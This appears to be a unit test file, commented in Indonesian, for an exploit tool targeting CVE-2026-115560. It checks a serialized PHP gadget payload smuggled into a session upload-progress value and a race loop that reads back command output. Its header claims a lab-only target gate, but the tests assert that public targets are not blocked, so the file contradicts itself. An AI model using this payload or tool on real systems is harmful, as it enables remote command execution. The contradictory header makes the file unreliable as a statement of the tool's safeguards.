"""Tes modul CVE-2026-115560 — murni (tanpa network): payload, gate, config.

Kontrak:
  - upload_progress_value menyisipkan '|' + serialized LabGadget
  - ensure_local_target menerima loopback/private, menolak public (SystemExit)
  - RaceConfig default masuk akal (sid hex, page dari URL)
  - gate lab-only TIDAK kalah oleh argumen (tidak ada flag bypass)
"""
import os
import sys
import threading
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from lib import cve115560 as m  # noqa: E402


class TestPayload115560(unittest.TestCase):
    def test_pipe_prefix_and_gadget(self):
        v = m.upload_progress_value("id", "p/R.txt")
        self.assertTrue(v.startswith("|"))
        self.assertIn('O:9:"LabGadget"', v)
        self.assertIn('s:2:"id"', v)
        self.assertIn('s:7:"p/R.txt"', v)

    def test_length_prefixes_accurate(self):
        import re
        v = m.upload_progress_value("uname -a", "p/O.txt")
        m1 = re.search(r's:3:"cmd";s:(\d+):"uname -a"', v)
        m2 = re.search(r's:3:"out";s:(\d+):"p/O.txt"', v)
        self.assertTrue(m1 and int(m1.group(1)) == len("uname -a"))
        self.assertTrue(m2 and int(m2.group(1)) == len("p/O.txt"))


class TestScopeInfo(unittest.TestCase):
    """target_scope = informasi, TIDAK memblokir (keputusan operator/RoE)."""

    def test_loopback_ok(self):
        self.assertEqual(m.target_scope("http://127.0.0.1:9404/"), "loopback")
        self.assertEqual(m.target_scope("http://localhost:9404/"), "loopback")

    def test_private_ok(self):
        self.assertEqual(m.target_scope("http://192.168.1.10/"), "private")
        self.assertEqual(m.target_scope("http://10.0.0.5:8080/"), "private")

    def test_public_classified_not_blocked(self):
        # public = label saja; TIDAK ada exception/yang mencegah pakai
        self.assertEqual(m.target_scope("http://1.2.3.4/"), "public")

    def test_no_bypass_flag_needed(self):
        # run_race/check_prereq tidak punya argumen gate — scope cuma log
        import inspect
        self.assertNotIn("ensure_local_target", inspect.getsource(m))


class TestRaceConfig(unittest.TestCase):
    def test_defaults(self):
        c = m.RaceConfig(url="http://127.0.0.1:9404/x.php")
        self.assertTrue(len(c.sid) == 16)
        self.assertEqual(c.page, "/x.php")
        self.assertEqual(c.cmd, "id")

    def test_page_normalized(self):
        c = m.RaceConfig(url="http://127.0.0.1/x.php", page="y.php")
        self.assertEqual(c.page, "/y.php")


class TestRaceProducerLifecycle(unittest.TestCase):
    """Audit P1: producer WAJIB dihentikan + di-join di semua jalur.

    Kontrak:
      - sukses / gagal-timeout / exception → cfg.stop set & thread berhenti
      - kunci lama (success/reads/proof) tetap ada; tambahan producer_stopped
      - join tidak menunggu sisa durasi penuh (wall-clock < duration)
      - producer yang macet → producer_stopped=False, tanpa crash
    """

    NAME = m._PRODUCER_NAME

    def _fake_producer(self, cfg):
        while not cfg.stop.is_set():
            time.sleep(0.01)

    def _alive_producers(self):
        return [t for t in threading.enumerate()
                if t.name == self.NAME and t.is_alive()]

    def _cfg(self, duration=0.2):
        return m.RaceConfig(url="http://127.0.0.1:9404/x.php",
                            duration=duration, poll=0.01)

    def _get_factory(self, proof=None, boom=None, on_proof=False):
        """proof: bytes utk endpoint proof; boom: exception saat proof dibaca."""
        proof_path = "/p/R.txt"

        def _get(url, sid, timeout=8.0):
            if url.endswith(proof_path):
                if boom is not None:
                    raise boom
                if proof is not None:
                    return 200, proof
                return 404, b"nope"
            if on_proof and boom is not None and url.endswith("/x.php"):
                return 200, b""
            return 200, b"page"
        return _get

    def test_success_stops_and_joins_producer(self):
        cfg = self._cfg(duration=5.0)
        logs = []
        with mock.patch.object(m, "_producer", self._fake_producer), \
                mock.patch.object(m, "_get", self._get_factory(proof=b"uid=0(root)\n")):
            res = m.run_race(cfg, log=logs.append)

        self.assertTrue(res["success"])
        self.assertEqual(res["reads"], 1)
        self.assertIn("uid=0", res["proof"])
        self.assertTrue(cfg.stop.is_set(), "stop harus ter-set jalur sukses")
        self.assertEqual(self._alive_producers(), [], "producer masih hidup")
        self.assertIs(res["producer_stopped"], True)

    def test_success_does_not_wait_full_duration(self):
        cfg = self._cfg(duration=5.0)
        t0 = time.time()
        with mock.patch.object(m, "_producer", self._fake_producer), \
                mock.patch.object(m, "_get", self._get_factory(proof=b"uid=0\n")):
            res = m.run_race(cfg, log=lambda s: None)
        elapsed = time.time() - t0
        self.assertTrue(res["success"])
        self.assertLess(elapsed, 1.0, f"stop/join menunggu durasi penuh ({elapsed:.2f}s)")

    def test_timeout_without_proof_stops_and_joins(self):
        cfg = self._cfg(duration=0.2)
        t0 = time.time()
        with mock.patch.object(m, "_producer", self._fake_producer), \
                mock.patch.object(m, "_get", self._get_factory(proof=None)):
            res = m.run_race(cfg, log=lambda s: None)
        elapsed = time.time() - t0

        self.assertFalse(res["success"])
        self.assertEqual(res["proof"], "")
        self.assertGreaterEqual(res["reads"], 1)
        self.assertTrue(cfg.stop.is_set())
        self.assertEqual(self._alive_producers(), [])
        self.assertIs(res["producer_stopped"], True)
        self.assertLess(elapsed, 0.2 + 1.0, f"melewati durasi+margin ({elapsed:.2f}s)")

    def test_exception_propagates_but_cleans_up(self):
        cfg = self._cfg(duration=5.0)
        with mock.patch.object(m, "_producer", self._fake_producer), \
                mock.patch.object(m, "_get",
                                  self._get_factory(boom=KeyboardInterrupt("boom"))):
            with self.assertRaises(KeyboardInterrupt):
                m.run_race(cfg, log=lambda s: None)

        self.assertTrue(cfg.stop.is_set(), "exception tidak boleh meninggalkan stop unset")
        self.assertEqual(self._alive_producers(), [], "producer yatim setelah exception")

    def test_runtime_error_in_success_path_cleans_up(self):
        """Exception lolos SETELAH result sukses dibentuk → finally tetap bersih.

        Catatan: RuntimeError dari `_get` sengaja ditelan (toleransi jaringan),
        jadi titik lolos yang realistis adalah log() di baris sukses.
        """
        cfg = self._cfg(duration=5.0)

        def boom_log(s):
            # hanya meledak pada log pembuka, yaitu tepat SETELAH t.start()
            if "race mulai" in s:
                raise RuntimeError("log mati")

        with mock.patch.object(m, "_producer", self._fake_producer), \
                mock.patch.object(m, "_get", self._get_factory(proof=b"uid=0\n")):
            with self.assertRaises(RuntimeError):
                m.run_race(cfg, log=boom_log)

        self.assertTrue(cfg.stop.is_set())
        self.assertEqual(self._alive_producers(), [])

    def test_stuck_producer_flagged_not_fatal(self):
        """Producer mengabaikan stop → producer_stopped=False, run tetap return."""
        released = threading.Event()

        def _stuck(cfg):
            released.wait(2.0)

        cfg = self._cfg(duration=0.1)
        logs = []
        with mock.patch.object(m, "_producer", _stuck), \
                mock.patch.object(m, "_JOIN_TIMEOUT", 0.1), \
                mock.patch.object(m, "_JOIN_MIN_TIMEOUT", 0.1), \
                mock.patch.object(m, "_get", self._get_factory(proof=None)):
            res = m.run_race(cfg, log=logs.append)

        self.assertFalse(res["success"])
        self.assertIs(res["producer_stopped"], False)
        self.assertTrue(any("belum berhenti" in s for s in logs))
        self.assertTrue(cfg.stop.is_set())
        released.set()
        for t in self._alive_producers():
            t.join(timeout=2.0)
        self.assertEqual(self._alive_producers(), [])


if __name__ == "__main__":
    unittest.main()
